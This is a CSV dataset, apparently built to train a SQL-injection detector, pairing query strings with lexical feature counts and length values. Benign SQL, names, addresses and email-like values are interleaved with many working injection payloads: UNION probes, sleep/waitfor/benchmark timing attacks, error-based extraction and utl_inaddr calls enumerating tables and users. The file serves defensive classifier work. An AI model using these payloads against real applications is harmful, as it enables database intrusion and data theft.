,Query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords,log_query_len,box_query_len
22816,select count ( early ) from your,0,0,2,0,0,6,0,0,0,0,0,24,0,0,2,3.4657359027997265,4.519779854678687
13567,47361,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
11173,"1%'  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",4,0,48,0,0,52,2,7,0,2,0,74,29,9,0,5.556828061699537,8.594557032287842
19235,"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 287 )  order by meta_id asc",0,0,10,0,0,15,0,0,0,0,0,71,3,0,2,4.61512051684126,6.603993955492575
29422,select * from ship where title between '1996-07-01' and '1996-07-31',4,0,9,0,0,9,0,1,5,0,0,34,16,0,1,4.219507705176107,5.846543550882007
27349,select * from total where during between 'scared' and 'faster',4,0,5,0,0,9,0,1,1,0,0,48,0,0,1,4.127134385045092,5.675937336868984
18823,oda,0,0,0,0,0,0,0,0,0,0,0,3,0,0,0,1.0986122886681098,1.19230319601282
14616,eddier,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
7056,"1%'   )    )    union all select null,null,null,null,null,null,null#",1,0,11,0,0,6,1,0,0,7,0,42,1,7,1,4.219507705176107,5.846543550882007
17968,valls,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
21772,select * from pound,0,0,1,0,0,3,0,0,1,0,0,15,0,0,1,2.9444389791664403,3.684523708911846
5210,select sleep  (  5  )   and    (    (   8679  =  8679,0,0,5,0,0,10,0,1,0,0,0,14,9,0,1,3.970291913552122,5.391515666300752
7414,"1""  )   union all select null,null,null,null,null,null,null#",0,1,9,0,0,5,0,0,0,7,0,42,1,7,1,4.0943445622221,5.615932130190505
18926,veronese vitte,0,0,0,0,0,1,0,0,0,0,0,13,0,0,0,2.6390573296152584,3.2241419783899143
10673,"iif  (  1483  =  7301,1,1/0  )  ",0,0,6,0,0,6,0,0,1,0,0,3,11,0,0,3.4657359027997265,4.519779854678687
3158,"1'+  (  select rqcw where 9002  =  9002 union all select null,null,null,null,null,null,null,null,null#",1,0,13,0,0,11,0,0,1,9,0,65,9,9,2,4.624972813284271,6.623425332724987
23948,select * from bread where easier = 'affect'  and city = 'foot',4,0,7,0,0,11,0,1,1,0,0,43,0,0,1,4.127134385045092,5.675937336868984
25598,select excitement ( s )  from lamp full outer join,0,0,2,0,0,9,0,0,0,0,0,38,0,0,2,3.912023005428146,5.287509109454676
18685,stankova@carrillo-de-albornoz.pt,0,0,4,0,0,0,0,0,2,0,0,28,0,0,0,3.4657359027997265,4.519779854678687
4462,1'  )   as fxid where 5926  =  5926,1,0,3,0,0,7,0,0,0,0,0,11,9,0,0,3.555348061489413,4.669921102482963
2243,1%'  )   and   (  7704  =  3494  )  *3494 and   (  '%'  =  ',4,0,13,0,0,13,2,2,1,0,0,6,13,0,0,4.0943445622221,5.615932130190505
3847,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,2,0,9,0,0,11,0,1,0,0,0,15,12,0,0,4.174387269895637,5.762920220853171
26998,select * from industrial  where safe = correctly,0,0,2,0,0,7,0,0,1,0,0,38,0,0,1,3.871201010907891,5.215173163969822
10839,"1'  )   and make_set  (  6488  =  5525,5525  )  ",1,0,7,0,0,9,0,1,0,0,0,10,13,0,0,3.871201010907891,5.215173163969822
13333,7.64e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
3047,"-2734'  )   union all select 5510,5510,5510,5510,5510#",1,0,8,0,0,5,0,0,1,0,0,14,24,0,1,3.9889840465642745,5.42506920217274
10385,"1  )   where 5598  =  5598 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",0,0,15,1,0,24,0,1,3,0,0,77,16,0,2,5.003946305945459,7.39263251475859
1415,1  )   as oknr where 3228  =  3228,0,0,2,0,0,7,0,0,0,0,0,11,9,0,0,3.5263605246161616,4.621137163019105
30442," select * from mirror order by too asc, particularly desc",0,0,2,0,0,10,0,0,1,0,0,45,0,0,2,4.04305126783455,5.522643883333643
18724,ivon,0,0,0,0,0,0,0,0,0,0,0,4,0,0,0,1.3862943611198906,1.5376610839645055
7371,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,0,17,1,0,27,0,1,3,0,0,75,16,0,2,5.056245805348308,7.502190543098655
22897,select min ( occasionally )  as courage from current,0,0,2,0,0,8,0,0,0,0,0,41,0,0,1,3.951243718581428,5.357417698153898
2398,"1""  )   as kndn where 9314  =  9314",0,1,3,0,0,7,0,0,0,0,0,11,9,0,0,3.555348061489413,4.669921102482963
27741,select * from fog where square  between 10 and 20,0,0,1,0,0,9,0,1,1,0,0,34,4,0,1,3.8918202981106265,5.251655965920898
24947,"   select valuable, dozen, importancefrom curve where statement  is not null",0,0,2,0,0,10,0,1,0,1,0,61,0,1,1,4.330733340286331,6.055066595411042
9921,"-3817""  )   as vugz where 3064  =  3064 or 9323  =  9323#",0,1,6,0,0,11,0,1,1,0,0,13,20,0,0,4.04305126783455,5.522643883333643
17761,miguel leon gracia 174,0,0,0,0,0,3,0,0,0,0,0,16,3,0,0,3.091042453358316,3.9129887722739327
7700,"-9451%""  )   union all select 9963,9963,9963--",0,1,8,1,0,5,1,0,3,0,0,14,16,0,1,3.828641396489095,5.140218969441503
1739,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""vjlr"" like ""vjlr",0,3,13,0,0,20,0,1,1,0,0,40,1,0,2,4.59511985013459,6.564633716663423
1013,"1' where 3612  =  3612 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,0,33,1,0,48,0,1,4,0,0,102,43,1,4,5.616771097666572,8.730835859060681
7895,"1%"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ""%""  =  """,0,4,13,0,0,14,2,2,0,0,1,18,22,0,0,4.418840607796598,6.222685223035155
19573,select * from customers where country = 'mexico';,2,0,5,0,0,7,0,0,1,0,0,37,0,0,1,3.8918202981106265,5.251655965920898
1885,"1""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""tiet"" like ""tiet",0,4,31,0,0,40,0,2,1,0,1,58,32,0,3,5.420534999272286,8.289131787627612
14972,49212,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
27846,select * from review where known between '1996-07-01' and '1996-07-31',4,0,9,0,0,9,0,1,5,0,0,36,16,0,1,4.248495242049359,5.900560584269694
14674,antone1@tiendasyofertas.ve,0,0,2,0,0,0,0,0,0,0,0,23,1,0,0,3.258096538021482,4.179397132269193
22531,"select * from pole where fifty between ""floor"" and    ""neck""",0,4,5,0,0,9,0,1,1,0,0,43,0,0,1,4.0943445622221,5.615932130190505
26705,select * from habit where empty = 'wish'  and city = 'stopped',4,0,7,0,0,11,0,1,1,0,0,43,0,0,1,4.127134385045092,5.675937336868984
24338,from  ( select distinct low from wish ) ,0,0,2,0,0,8,0,0,0,0,0,29,0,0,1,3.688879454113936,4.897348914472564
17143,robelo@moviels.me,0,0,2,0,0,0,0,0,0,0,0,15,0,0,0,2.833213344056216,3.514446415767603
12015,9423,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
13628,lorraine,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
7942,"1""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""oyfz""  =  ""oyfz",0,4,20,0,0,26,0,2,1,0,0,83,8,0,2,5.123963979403259,7.645305127152001
7010,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",4,0,17,0,0,24,0,2,1,0,0,86,9,0,2,5.003946305945459,7.39263251475859
20079,"  select   coalesce ( null, null, null, 'w3schools.com', null, 'example.com' ) ;",4,0,14,0,0,11,0,0,0,4,0,51,1,4,1,4.382026634673881,6.152384767567401
10955,1  )   and 7533  =  7533 and   (  7175  =  7175,0,0,4,0,0,10,0,2,0,0,0,6,17,0,0,3.8501476017100575,5.178036175455065
18092,bechara,0,0,0,0,0,0,0,0,0,0,0,7,0,1,0,1.9459101490553128,2.25279015210122
17719,ariel,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
1413," select sleep  (  5  )   and ""cyrb""  =  ""cyrb",0,3,6,0,0,9,0,1,0,0,0,22,1,0,1,3.80666248977032,5.101693885125393
2279,"-8364'  )   union all select 4732,4732,4732,4732,4732,4732,4732,4732,4732#",1,0,12,0,0,5,0,0,1,0,0,14,40,0,1,4.30406509320417,6.004758445183105
2646,-2050' union all select 5606#,1,0,3,0,0,4,0,0,1,0,0,14,8,0,1,3.367295829986474,4.357111686472804
160," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",0,2,9,1,0,18,0,2,3,0,0,26,4,0,1,4.143134726391533,5.7053230539652695
10122,1'   )    )    as tlsl where 8467  =  8467,1,0,4,0,0,8,0,0,0,0,0,11,9,0,0,3.737669618283368,4.981567234930947
4635,1'||  (  select 'gnil' from dual where 7552  =  7552 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  ||',4,0,18,0,0,29,0,2,0,0,1,54,21,0,2,5.010635294096256,7.406597807788619
25601,select writer ( s )  from entire select thirty ( s ) ,0,0,4,0,0,12,0,0,0,0,0,36,0,0,2,3.970291913552122,5.391515666300752
3012,select sleep  (  5  )  #,0,0,3,0,0,5,0,0,0,0,0,11,1,0,1,3.1780538303479458,4.05093304771096
11973,2.46e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
29524,"  select dropped as right, common as [accident]  from art",0,0,3,0,0,9,0,0,0,0,0,43,0,0,1,4.04305126783455,5.522643883333643
22670,select * from art  where best = breathe,0,0,2,0,0,7,0,0,1,0,0,29,0,0,1,3.6635616461296463,4.853884482035236
22243,"  select substanceid as id, instant as triangle from bush",0,0,1,0,0,9,0,0,0,0,0,46,0,0,1,4.04305126783455,5.522643883333643
409, )    )   ;waitfor delay '0:0:__time__'--,2,0,13,1,0,5,0,0,2,0,0,16,2,0,0,3.713572066704308,4.939896154656966
25755,select top 50 percent * from sort select * from wind fetch first 50 percent rows onlyselect top 3 * from chief,0,0,3,0,0,21,0,0,3,0,0,81,5,0,6,4.700480365792417,6.77328459478072
21036,select count ( trip ) from color,0,0,2,0,0,6,0,0,0,0,0,24,0,0,2,3.4657359027997265,4.519779854678687
12698,6208,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
24926,select distinct occasionally from wonder,0,0,0,0,0,4,0,0,0,0,0,36,0,0,1,3.688879454113936,4.897348914472564
15967,amoeiro,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
18696,"c/ berruguete 23,",0,0,2,0,0,2,0,0,1,0,0,11,2,0,0,2.833213344056216,3.514446415767603
9768,1'  )   as sruz where 6318  =  6318,1,0,3,0,0,7,0,0,0,0,0,11,9,0,0,3.555348061489413,4.669921102482963
2161,"-3215""  )   union all select 4457,4457,4457,4457,4457#",0,1,8,0,0,5,0,0,1,0,0,14,24,0,1,3.9889840465642745,5.42506920217274
11954,rorke,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
1176,"-9295   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )",0,0,33,0,0,54,0,1,6,0,0,71,35,7,2,5.541263545158426,8.559367492058051
14163,antulio,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
15986,tuset mendel,0,0,0,0,0,1,0,0,0,0,0,11,0,0,0,2.4849066497880004,2.999482870035824
12531,tu6e3a5a,0,0,0,0,0,0,0,0,0,0,0,5,3,0,0,2.079441541679836,2.432300417938136
11999,hoya-gonzalo,0,0,1,0,0,0,0,0,1,0,0,11,0,0,0,2.4849066497880004,2.999482870035824
25711,select keep from cow,0,0,0,0,0,3,0,0,0,0,0,17,0,0,1,2.995732273553991,3.7638991627446954
16552,9224,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
2030,"1%""  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",0,1,16,1,0,20,1,1,3,0,0,64,8,0,2,4.812184355372417,6.9980558521596
27732,select count ( teach ) from pleasure,0,0,2,0,0,6,0,0,0,0,0,28,0,0,2,3.58351893845611,4.717530264472627
13856,molet,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
16411,7.70e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
13619,"c/ rua mayor, 31, 1?e",0,0,4,0,0,4,0,0,1,0,0,10,3,0,0,3.044522437723423,3.839958531231341
21560,"  select orders.yourselfrid, employees.hit, employees.birthday from ordersright join employees on orders.employeeid  =  employees.dutyid order by orders.cabinid",0,0,9,0,0,15,0,0,0,0,0,133,0,0,3,5.075173815233827,7.542049364654595
17001,qunola,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
28642,"   select monkey, operation+ ', ' + finger+ ' ' + tool+ ', ' + speed as built  from development",6,0,15,0,0,19,0,0,6,0,0,58,0,0,1,4.553876891600541,6.483834243658689
16229,"hospitalet de llobregat, l'",1,0,2,0,0,3,0,0,0,0,0,22,0,0,0,3.295836866004329,4.240494654101009
19911,select sign ( -12 ) ;,0,0,4,0,0,5,0,0,1,0,0,10,2,0,1,3.044522437723423,3.839958531231341
24718,select base ( s )  from is union all,0,0,2,0,0,8,0,0,0,0,0,25,0,0,1,3.58351893845611,4.717530264472627
18174,16813,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
15533,nagyszeder.kehoe@creacionesacampada.es,0,0,3,0,0,0,0,0,0,0,0,35,0,0,0,3.6375861597263857,4.809458789423759
14474,deba,0,0,0,0,0,0,0,0,0,0,0,4,0,0,0,1.3862943611198906,1.5376610839645055
24717,select paint ( s )  from saddle select full ( s ) ,0,0,4,0,0,12,0,0,0,0,0,33,0,0,2,3.912023005428146,5.287509109454676
16410,miera,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
15863,almirall pahisa,0,0,0,0,0,1,0,0,0,0,0,14,0,0,0,2.70805020110221,3.326353218260614
6664,"1  )   where 4768  =  4768 union all select null,null,null,null,null,null,null,null#",0,0,10,0,0,9,0,0,0,8,0,51,9,8,1,4.430816798843313,6.245637257588747
25354,select min ( plan )  as doctor from touch,0,0,2,0,0,8,0,0,0,0,0,30,0,0,1,3.713572066704308,4.939896154656966
10935,"1%'  )   union all select null,null,null,null,null--",1,0,9,1,0,5,1,0,2,5,0,34,1,5,1,3.951243718581428,5.357417698153898
26841,select avg ( map ) from forward,0,0,2,0,0,6,0,0,0,0,0,23,0,0,2,3.4339872044851463,4.467059038127735
6555,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",4,0,23,0,0,34,2,2,1,0,0,111,12,0,2,5.351858133476067,8.137533919888101
20163,"   select orders.orderid, customers.customername, shippers.shippernamefrom     (  (  ordersinner join customers on orders.customerid  =  customers.customerid )   inner join shippers on orders.shipperid  =  shippers.shipperid ) ;",0,0,16,0,0,23,0,0,0,0,0,175,0,0,3,5.429345628954441,8.308691449703643
30348,"   select local, needed, ratherfrom law where doctor  is not null",0,0,2,0,0,10,0,1,0,1,0,50,0,1,1,4.174387269895637,5.762920220853171
3133,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'jiyx'  =  'jiyx",4,0,15,0,0,19,0,2,1,0,0,42,13,0,2,4.709530201312334,6.791357624410744
22653,select sport ( s )  from average select usual from weigh,0,0,2,0,0,10,0,0,0,0,0,43,0,0,2,4.02535169073515,5.490616172199279
17954,3641,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
10519,"1' where 6853  =  6853 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,0,25,1,0,35,0,1,3,0,1,48,40,0,3,5.2574953720277815,7.931717373270634
8630,1'+  (  select 'hrxp' where 5948  =  5948,3,0,6,0,0,7,0,0,1,0,0,15,9,0,1,3.713572066704308,4.939896154656966
14009,"av. don juan de borbon, s/n",0,0,3,0,0,5,0,0,1,0,0,19,0,0,0,3.295836866004329,4.240494654101009
10422,"-7234""  )   union all select 3154,3154,3154,3154#",0,1,7,0,0,5,0,0,1,0,0,14,20,0,1,3.8918202981106265,5.251655965920898
2698,"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'jhle' like 'jhle",4,0,37,0,0,44,0,5,0,1,0,67,24,6,0,5.438079308923196,8.328105302377208
17179,2055,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
2427,"1%"" and elt  (  4249  =  4249,7259  )   and ""%""  =  """,0,4,11,0,0,11,2,2,0,0,0,9,13,0,0,3.970291913552122,5.391515666300752
10572,"-2211"" or 2113  =  8885#",0,1,4,0,0,4,0,1,1,0,0,2,12,0,0,3.1780538303479458,4.05093304771096
318," and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  table_name  )   from   (  select distinct  (  table_name  )  , rownum as limit from sys.all_tables  )   where limit  =  4   )    )    and 'i'  =  'i",3,0,25,0,0,35,0,2,0,0,0,120,2,0,2,5.384495062789089,8.209386109454032
3985,"1'||  (  select 'txyy' where 6500  =  6500 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||'",4,0,27,0,0,30,0,2,0,0,1,64,32,0,1,5.267858159063328,7.954180556327593
26389,select folks ( s )  from loss select might ( s ) ,0,0,4,0,0,12,0,0,0,0,0,32,0,0,2,3.8918202981106265,5.251655965920898
26830,select min ( brown )  as forget from thirty,0,0,2,0,0,8,0,0,0,0,0,32,0,0,1,3.7612001156935615,5.022400427811018
19864,select ceil ( 25 ) ;,0,0,3,0,0,5,0,0,0,0,0,10,2,0,1,2.995732273553991,3.7638991627446954
25484,select * from something where characteristic between '1996-07-01' and '1996-07-31',4,0,9,0,0,9,0,1,5,0,0,48,16,1,1,4.406719247264253,6.199496085735905
27997,"  update kitchen set wrote =  'ants', city =  'satellites' where we =  range",4,0,8,0,0,13,0,0,0,0,0,51,0,0,0,4.330733340286331,6.055066595411042
19095,orazio,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
25878,select * from word where is between education09/01/1996elephant and twelve15/31/1996cut,0,0,5,0,0,9,0,1,5,0,0,57,16,0,1,4.465908118654584,6.313121924766899
28745,"  select orders.fallenrid, employees.ranch, employees.worry from ordersright join employees on orders.employeeid  =  employees.heldid order by orders.biteid",0,0,9,0,0,15,0,0,0,0,0,129,0,0,3,5.049856007249537,7.48875985367401
1851,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,0,0,11,1,0,18,0,1,3,0,0,32,2,0,2,4.442651256490317,6.268357393526619
15454,xaudiera alicea,0,0,0,0,0,1,0,0,0,0,0,14,0,0,0,2.70805020110221,3.326353218260614
29686,select top 50 percent * from subject select * from people fetch first 50 percent rows onlyselect top 3 * from building,0,0,3,0,0,21,0,0,3,0,0,89,5,0,6,4.770684624465665,6.914118695344334
13352,manda,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
2739,select   (  case when   (  1946  =  1302  )   then 1946 else 1/  (  select 0  )   end  )  --,0,0,10,1,0,19,0,0,3,0,0,31,14,0,2,4.5217885770490405,6.42130769614405
20041,"  select time_format ( ""19:30:10"", ""%h %i %s %p"" ) ;",0,4,15,0,0,10,4,0,0,0,0,20,6,0,1,3.951243718581428,5.357417698153898
26458,select * from coach where wonder like '%know%',2,0,5,0,0,7,2,0,1,0,0,34,0,0,1,3.828641396489095,5.140218969441503
13132,98918059g,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
29608,select * from design where smoke  between 10 and 20,0,0,1,0,0,9,0,1,1,0,0,36,4,0,1,3.9318256327243257,5.322755734775789
15546,venialbo,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
24195,select * from courage  where grow not like '[thought]%',2,0,6,0,0,8,1,1,1,0,0,40,0,0,1,4.007333185232471,5.458096843121287
13416,9nte0uer3o,0,0,0,0,0,0,0,0,0,0,0,7,3,0,0,2.302585092994046,2.7402564225600523
25413,select plan,0,0,0,0,0,1,0,0,0,0,0,10,0,0,1,2.3978952727983707,2.8749024412290907
3666,"1'  )   where 7658  =  7658 union all select null,null#",1,0,5,0,0,9,0,0,0,2,0,27,9,2,1,4.007333185232471,5.458096843121287
26526,select catch ( s )  from field,0,0,2,0,0,6,0,0,0,0,0,21,0,0,1,3.4011973816621555,4.412867051146341
640, and 1  =  utl_inaddr.get_host_address   (    (   select count  (  distinct  (  username   )    )    from sys.all_users   )    )    and 'i'  =  'i,3,0,19,0,0,22,0,2,0,0,0,73,1,0,2,4.983606621708336,7.350251518992875
3665,1' in boolean mode  )   rlike sleep  (  5  )  #,1,0,5,0,0,10,0,0,0,0,0,23,2,0,0,3.8501476017100575,5.178036175455065
14526,"c/ don bosco 65, 10-d",0,0,3,0,0,4,0,0,2,0,0,10,4,0,0,3.044522437723423,3.839958531231341
7050,"1'||  (  select 'qued' where 9801  =  9801 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",3,0,24,0,0,29,0,1,0,0,1,65,31,0,1,5.220355825078324,7.851491318972704
3007,"1'||  (  select 'jlka' where 5436  =  5436 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",3,0,20,1,0,26,0,2,3,0,0,79,16,0,3,5.056245805348308,7.502190543098655
30093,"  select * from cannot where soft in  ( 'toward', 'harbor', 'cloth' )  ",6,0,11,0,0,13,0,0,1,0,0,44,0,0,1,4.262679877041316,5.927077040928176
23092,select * from gone where automobile = 'smaller' limit 3,2,0,4,0,0,9,0,0,1,0,0,41,1,0,1,4.007333185232471,5.458096843121287
